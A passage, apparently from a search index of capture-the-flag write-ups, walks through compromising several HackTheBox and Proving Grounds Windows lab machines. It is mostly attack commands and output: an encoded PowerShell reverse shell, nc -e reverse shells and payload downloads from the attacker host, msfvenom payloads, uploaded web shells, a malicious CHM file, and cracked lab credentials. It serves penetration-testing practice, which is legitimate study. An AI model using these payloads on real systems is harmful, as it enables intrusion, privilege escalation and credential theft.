\n[*] CVE: CVE-2018-9276                                                      [*] \n[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] \n[+]#########################################################################[+] \n\n# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.                                                                                                             \n# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'               \n\n[+]#########################################################################[+] \n\n [*] file created \n [*] sending notification wait....\n\n [*] adding a new user 'pentest' with password 'P3nT3st' \n [*] sending notification wait....\n\n [*] adding a user pentest to the administrators group \n [*] sending notification wait....\n\n\n [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! \n</code></pre> <p>You can check the user with <code>nxc</code>:</p> <p></p> <pre><code>$ impacket-psexec pentest:'P3nT3st!'@10.10.10.152\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on 10.10.10.152.....\n[*] Found writable share ADMIN$\n[*] Uploading file KCrmulCz.exe\n[*] Opening SVCManager on 10.10.10.152.....\n[*] Creating service fcVl on 10.10.10.152.....\n[*] Starting service fcVl.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"netmon/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags:</p> <pre><code>C:\\Users\\Public\\Desktop&gt; type user.txt\n0fe81dbc5fcd232892dc3c5b7fd24fcf\n\nC:\\Users\\Administrator\\Desktop&gt; ype root.txt\n6984b9873bd41d7af69204c3999c0d41\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"remote/","title":"Remote","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"remote/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.180\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 21:52 CEST\nNmap scan report for 10.10.10.180\nHost is up (0.042s latency).\nNot shown: 65489 closed tcp ports (reset), 30 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Home - Acme Widgets\n111/tcp   open  rpcbind?\n|_rpcinfo: ERROR: Script execution failed (use -d to debug)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n2049/tcp  open  mountd        1-3 (RPC #100005)\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49678/tcp open  msrpc         Microsoft Windows RPC\n49679/tcp open  msrpc         Microsoft Windows RPC\n49680/tcp open  msrpc         Microsoft Windows RPC\n\nTRACEROUTE (using port 139/tcp)\nHOP RTT      ADDRESS\n1   41.06 ms 10.10.14.1\n2   41.20 ms 10.10.10.180\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 112.45 seconds\n</code></pre> <p>The site at port <code>80</code> shows a web page about Acme Widgets.</p> <p></p> <p>It seems that the blog is made with Umbraco CMS. According to the official docs, the login panel is at <code>/umbraco</code>.</p> <p></p> <p>There is a port <code>2049</code> open, which is usually an NFS service.</p> <pre><code>$ showmount -e 10.10.10.180                                       \nExport list for 10.10.10.180:\n/site_backups (everyone)\n</code></pre> <p>Mount the share:</p> <pre><code>mkdir site_backups\n$ sudo mount -t nfs 10.10.10.180:/site_backups site_backups\n</code></pre> <p>Searching the files, we can see some hashes inside <code>Umbraco.sdf</code>:</p> <pre><code>$ strings Umbraco.sdf | grep hash -C 2\nAdministratoradmindefaulten-US\nAdministratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d\nAdministratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d\nadminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50\nadminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f\nsmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={\"hashAlgorithm\":\"HMACSHA256\"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e\nssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={\"hashAlgorithm\":\"HMACSHA256\"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749\nssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={\"hashAlgorithm\":\"HMACSHA256\"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32\n</code></pre> <p>Crack the hash using <code>hashcat</code> and module <code>100</code>, which is SHA1:</p> <pre><code>$ hashcat -m 100 hashes /usr/share/wordlists/rockyou.txt --force\nhashcat (v6.2.6) starting\n\nYou have enabled --force to bypass dangerous warnings and errors!\nThis can hide serious problems and should only be done when debugging.\nDo not report hashcat issues encountered when using --force.\n\nb8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"remote/#initial-access","title":"Initial Access","text":"<p>Enter the Umbraco admin panel with <code>admin@htb.local</code> and the password <code>baconandcheese</code>.</p> <p></p> <p>We can see that the version is , so searching for an authenticated exploit we have https://github.com/noraj/Umbraco-RCE.</p> <pre><code>$ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell.exe -a \"-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\"\n</code></pre> <pre><code>$ rlwrap nc -lnvp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.14] from (UNKNOWN) [10.10.10.180] 49873\nwhoami\niis apppool\\defaultapppool\n</code></pre> <p>The user has <code>SeImpersonate</code> privileges, so upload <code>nc.exe</code> and <code>printspoofer.exe</code>.</p> <pre><code>PS C:\\windows\\temp&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeAuditPrivilege              Generate security audits                  Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n</code></pre> <pre><code>PS C:\\windows\\temp&gt; iwr -uri http://10.10.14.14:8000/nc.exe -outfile nc.exe\nPS C:\\windows\\temp&gt; iwr -uri http://10.10.14.14:8000/PrintSpoofer64.exe -outfile ps.exe\n</code></pre> <pre><code>PS C:\\windows\\temp&gt; .\\ps.exe -c \"C:\\windows\\temp\\nc.exe 10.10.14.14 7777 -e cmd\"\n[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\n</code></pre> <pre><code>$ rlwrap nc -lnvp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.14.14] from (UNKNOWN) [10.10.10.180] 49884\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nnt authority\\system\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"remote/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags:</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt;type root.txt\ntype root.txt\n92038b8957d9b7e341bfbe45cd6bd939\n\nC:\\Users\\Administrator\\Desktop&gt;powershell\npowershell\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\Administrator\\Desktop&gt; Get-ChildItem -Path C:\\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue\nGet-ChildItem -Path C:\\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue\n\n\n    Directory: C:\\Users\\Public\\Desktop\n\n\nMode                LastWriteTime         Length Name                                                                  \n----                -------------         ------ ----                                                                  \n-ar---         6/6/2025   3:50 PM             34 user.txt                                                              \n\nPS C:\\Users\\Administrator\\Desktop&gt; type C:\\users\\public\\desktop\\user.txt\ntype C:\\users\\public\\desktop\\user.txt\n6f3ecfff4fe7fc64d783baad85e3bebe\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"secnotes/","title":"Secnotes","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"secnotes/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.97\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 20:52 CEST\nNmap scan report for 10.10.10.97\nHost is up (0.041s latency).\nNot shown: 65532 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT     STATE SERVICE      VERSION\n80/tcp   open  http         Microsoft IIS httpd 10.0\n| http-title: Secure Notes - Login\n|_Requested resource was login.php\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)\n8808/tcp open  http         Microsoft IIS httpd 10.0\n|_http-title: IIS Windows\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 10|2019 (97%)\nOS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019\nAggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb-os-discovery: \n|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)\n|   OS CPE: cpe:/o:microsoft:windows_10::-\n|   Computer name: SECNOTES\n|   NetBIOS computer name: SECNOTES\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2025-05-18T11:53:40-07:00\n| smb2-time: \n|   date: 2025-05-18T18:53:41\n|_  start_date: N/A\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_clock-skew: mean: 2h20m00s, deviation: 4h02m29s, median: 0s\n\nTRACEROUTE (using port 445/tcp)\nHOP RTT      ADDRESS\n1   40.63 ms 10.10.14.1\n2   41.14 ms 10.10.10.97\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 82.61 seconds\n</code></pre> <p><code>Port</code> <code>8808</code> shows the default <code>IIS</code> site and <code>port</code> <code>80</code> shows a login form.</p> <p></p> <p>Create an account and log in.</p> <p></p> <p>There is a user named <code>tyler</code> that we can contact, and there is no protection against <code>XSS</code> when creating a note.</p> <p>When changing the password, the request is also processed with <code>GET</code>, so we could send the request to change the password in the contact text with an <code>XSS</code>.</p> <p></p> <p><code>XSS</code> is not needed, only send the URL and enter as <code>tyler</code> with the new password.</p> <p></p> <p><code>tyler:92g!mA8BGjOirkL%OG*&amp;</code></p> <p>Checking credentials and shares, we see that the user can write in a share.</p> <p></p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"secnotes/#initial-access","title":"Initial Access","text":"<p>This is the root folder for <code>IIS</code>, so we can upload an <code>aspx</code>, <code>asp</code>, <code>config</code>, or <code>php</code> reverse shell.</p> <p>Get a <code>PHP</code> rev shell and put it in the folder, start the listener, and browse the page.</p> <pre><code>$ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&amp;' //secnotes.htb/new-site\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; put shell.php\nputting file shell.php as \\shell.php (70.3 kb/s) (average 70.3 kb/s)\n</code></pre> <pre><code>$ sudo rlwrap nc -lnvp 80\nlistening on [any] 80 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.10.97] 49913\nSOCKET: Shell has connected! PID: 4448\nMicrosoft Windows [Version 10.0.17134.228]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\inetpub\\new-site&gt;whoami\niis apppool\\newsite\n</code></pre> <p>The shell was unstable, so I put a web shell to get an <code>msfvenom</code> reverse shell.</p> <p></p> <pre><code>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=80 -f exe -o reverse.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\nSaved as: reverse.exe\n\nsmb: \\&gt; put reverse.exe\nputting file reverse.exe as \\reverse.exe (56.0 kb/s) (average 29.5 kb/s)\n</code></pre> <p></p> <pre><code>$ sudo rlwrap nc -lnvp 80\nlistening on [any] 80 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.10.97] 50262\nMicrosoft Windows [Version 10.0.17134.228]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\inetpub\\new-site&gt;whoami\nwhoami\nsecnotes\\tyler\n</code></pre> <p>Get the flag:</p> <pre><code>C:\\Users\\tyler\\Desktop&gt;type user.txt\ntype user.txt\n3e39543df04f653c45220f80fed60766\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"secnotes/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>winPEAS</code> and find that <code>WSL</code> and <code>Ubuntu</code> are installed.</p> <p></p> <p>Go to the root folder of the distro and search <code>root</code>'s history.</p> <pre><code>PS C:\\Users\\tyler\\AppData\\Local\\Packages\\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\\LocalState\\rootfs\\root&gt; type .bash_history\ncd /mnt/c/\nls\ncd Users/\ncd /\ncd ~\nls\npwd\nmkdir filesystem\nmount //127.0.0.1/c$ filesystem/\nsudo apt install cifs-utils\nmount //127.0.0.1/c$ filesystem/\nmount //127.0.0.1/c$ filesystem/ -o user=administrator\ncat /proc/filesystems\nsudo modprobe cifs\nsmbclient\napt install smbclient\nsmbclient\nsmbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\\\\\127.0.0.1\\\\c$\n&gt; .bash_history \nless .bash_history\nexit\n</code></pre> <p></p> <pre><code>$ impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@secnotes.htb\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on secnotes.htb.....\n[*] Found writable share ADMIN$\n[*] Uploading file JstWrSBE.exe\n[*] Opening SVCManager on secnotes.htb.....\n[*] Creating service ldar on secnotes.htb.....\n[*] Starting service ldar.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17134.228]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\WINDOWS\\system32&gt; whoami\nnt authority\\system\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"secnotes/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt; type root.txt\n13193dc2dd40a8c4f431cb347f764f2c\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"sniper/","title":"Sniper","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"sniper/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.151\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 10:09 CEST\nNmap scan report for 10.10.10.151\nHost is up (0.041s latency).\nNot shown: 65530 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: Sniper Co.\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n49667/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 7h01m48s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2025-06-12T15:12:49\n|_  start_date: N/A\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   40.73 ms 10.10.14.1\n2   40.84 ms 10.10.10.151\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 126.54 seconds\n</code></pre> <p>Website shows a Sniper Co. page</p> <p></p> <p>Going to <code>/blog</code>, we see a <code>lang</code> parameter in the URL. Testing for LFI, if we put <code>\\windows\\win.ini</code>, the page loads and we can see the file in the code.</p> <p></p> <p>Trying an RFI UNC attack, we could try to capture the user hash by trying to connect to an <code>impacket-smbserver</code>, but it doesn't work, so we can try <code>net usershare</code> to host an SMB share and execute files.</p> <pre><code>$ service smbd start   \n# important to create the share outside user homes\n$ cd /srv\n$ mkdir share\n$ cd share\n$ sudo net usershare add test $(pwd) '' 'Everyone:F' guest_ok=y\n</code></pre> <p>Then from the webpage, we can read an <code>info.php</code>, for example.</p> <p></p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"sniper/#initial-access","title":"Initial Access","text":"<p>Now do the same but with a PHP reverse shell.</p> <pre><code>$ rlwrap nc -lnvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.17] from (UNKNOWN) [10.10.10.151] 49680\nSOCKET: Shell has connected! PID: 7080\nMicrosoft Windows [Version 10.0.17763.678]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\inetpub\\wwwroot\\blog&gt;whoami\niis apppool\\defaultapppool\n</code></pre> <p>There is <code>winrm</code> running but firewalled, so we can port forward it.</p> <p></p> <p>Inside the <code>user</code> folder in the web project, we find the database credentials</p> <pre><code>PS C:\\inetpub\\wwwroot\\user&gt; ls\n\n\n    Directory: C:\\inetpub\\wwwroot\\user\n\n\nMode                LastWriteTime         Length Name                                                                  \n----                -------------         ------ ----                                                                  \nd-----        4/11/2019   5:52 AM                css                                                                   \nd-----        4/11/2019   5:23 AM                fonts                                                                 \nd-----        4/11/2019   5:23 AM                images                                                                \nd-----        4/11/2019   5:23 AM                js                                                                    \nd-----        4/11/2019   5:23 AM                vendor                                                                \n-a----        4/11/2019   5:15 PM            108 auth.php                                                              \n-a----        4/11/2019  10:51 AM            337 db.php                                                                \n-a----        4/11/2019   6:18 AM           4639 index.php                                                             \n-a----        4/11/2019   6:10 AM           6463 login.php                                                             \n-a----         4/8/2019  11:04 PM            148 logout.php                                                            \n-a----        10/1/2019   8:42 AM           7192 registration.php                                                      \n-a----        8/14/2019  10:35 PM           7004 registration_old123123123847.php                                      \n\n\nPS C:\\inetpub\\wwwroot\\user&gt; type db.php\n&lt;?php\n// Enter your Host, username, password, database below.\n// I left password empty because i do not set password on localhost.\n$con = mysqli_connect(\"localhost\",\"dbuser\",\"36mEAhz/B8xQ~2VM\",\"sniper\");\n// Check connection\nif (mysqli_connect_errno())\n  {\n  echo \"Failed to connect to MySQL: \" . mysqli_connect_error();\n  }\n?&gt;\n</code></pre> <p>And there is a <code>chris</code> user. Let's test the password using <code>nxc</code>.</p> <pre><code>PS C:\\inetpub\\wwwroot\\user&gt; net user\n\nUser accounts for \\\\\n\n-------------------------------------------------------------------------------\nAdministrator            Chris                    DefaultAccount           \nGuest                    WDAGUtilityAccount       \nThe command completed with one or more errors.\n</code></pre> <p></p> <p>The password works for <code>chris</code>, so port forward <code>winrm</code> to access the machine as <code>chris</code>.</p> <p>Transfer <code>chisel</code> to the host and create a port forwarding</p> <pre><code>$ ./chisel server --port 8888 --reverse\n2025/06/12 18:28:50 server: Reverse tunnelling enabled\n2025/06/12 18:28:50 server: Fingerprint 7yf/mGFiCoZ+2gBRK50StHJXJEC9ZBhDfPxGwJyI6DA=\n2025/06/12 18:28:50 server: Listening on http://0.0.0.0:8888\n2025/06/12 18:30:15 server: session#1: tun: proxy#R:5985=&gt;localhost:5985: Listening\n</code></pre> <pre><code>PS C:\\users\\public&gt; .\\chisel.exe client 10.10.14.17:8888 R:5985:localhost:5985\n.\\chisel.exe : 2025/06/12 16:32:03 client: Connecting to ws://10.10.14.17:8888\nAt line:1 char:1\n+ .\\chisel.exe client 10.10.14.17:8888 R:5985:localhost:5985\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (2025/06/12 16:3...0.10.14.17:8888:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\n\n2025/06/12 16:32:04 client: Connected (Latency 42.2454ms)\n</code></pre> <p>Connect to it via <code>evil-winrm</code></p> <pre><code>$ evil-winrm -i localhost -u chris -p 36mEAhz/B8xQ~2VM\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Chris\\Documents&gt; whoami\nsniper\\chris\n</code></pre> <p>Get the flag</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Chris\\desktop&gt; type user.txt\nb56f5fdc204fccaaa4ed7802a1fa357a\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"sniper/#privilege-escalation","title":"Privilege Escalation","text":"<p>The user has a <code>.chm</code> file inside <code>downloads</code>.</p> <p></p> <p>And the CEO left a message to <code>chris</code> for him to finish the app documentation.</p> <p></p> <p>So it seems that the <code>.chm</code> file from <code>chris</code>'s folder is the documentation that he has to finish.</p> <p>Transfer the file out to a Windows machine and open it.</p> <p>We can make a malicious <code>.chm</code> file with https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</p> <pre><code>Out-CHM -Payload \"C:\\programdata\\nc.exe -e cmd.exe 10.10.14.17 4444\" -HHCPath \"C:\\Program Files (x86)\\HTML Help Workshop\"\n</code></pre> <p>Transfer the <code>doc.chm</code> to Kali and then to the machine</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Chris\\downloads&gt; upload doc.chm\n\nInfo: Uploading /home/kali/htb/sniper/doc.chm to C:\\Users\\Chris\\downloads\\doc.chm\n\nData: 17928 bytes of 17928 bytes copied\n\nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\Chris\\downloads&gt; upload nc.exe\n\nInfo: Uploading /home/kali/htb/sniper/nc.exe to C:\\Users\\Chris\\downloads\\nc.exe\n\nData: 79188 bytes of 79188 bytes copied\n</code></pre> <p>Move <code>nc.exe</code> to <code>C:\\programdata</code> and <code>doc.chm</code> to <code>C:\\docs</code> and start a listener</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Chris\\downloads&gt; cp nc.exe C:\\programdata\n*Evil-WinRM* PS C:\\Users\\Chris\\downloads&gt; cp doc.chm C:\\docs\n</code></pre> <pre><code>$ rlwrap nc -lnvp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.17] from (UNKNOWN) [10.10.10.151] 49711\nMicrosoft Windows [Version 10.0.17763.678]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nsniper\\administrator\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"sniper/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt;type root.txt\ntype root.txt\n3be869dfedc4788b9da4dfe192a5405e\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"access/","title":"Access \ud83d\udd38","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"access/#enumeration","title":"Enumeration","text":"<p>Web server shows a page about the event.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"access/#initial-access","title":"Initial Access","text":"<p>We can upload images, so we can upload a webshell; change the extension by intercepting the request and change it from <code>.png</code> to <code>.php...</code></p> <p></p> <p>File will be in <code>/uploads</code> (discovered with <code>feroxbuster</code>).</p> <p></p> <p>Now let's try to get a reverse shell:</p> <pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.45.220',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i 